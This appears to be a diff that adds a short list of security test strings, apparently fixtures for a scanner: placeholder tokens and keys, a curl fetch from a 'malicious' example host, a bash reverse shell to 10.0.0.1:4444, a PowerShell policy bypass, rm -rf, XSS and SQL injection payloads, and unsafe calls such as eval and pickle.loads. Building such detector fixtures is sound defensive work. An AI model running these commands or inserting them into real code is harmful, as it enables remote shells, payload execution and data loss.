@@ -1,0 +1,21 @@
+username = admin
+password = password123
+token = ghp_1234567890ABCDEF
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+api_key = ABC123SECRET
+curl http://malicious.example.com/payload.sh
+powershell.exe -ExecutionPolicy Bypass
+os.system("rm -rf /tmp")
+eval(user_input)
+subprocess.run(["bash"])
+bash -i >& /dev/tcp/10.0.0.1/4444
+<script>alert('xss')</script>
+' OR 1=1 --
+AKIA1234567890ABCDEF12
+admin:admin
+/debug/status
+/admin/users
+/api/v1/login
+10.10.10.15
+test@example.com
+pickle.loads(data)
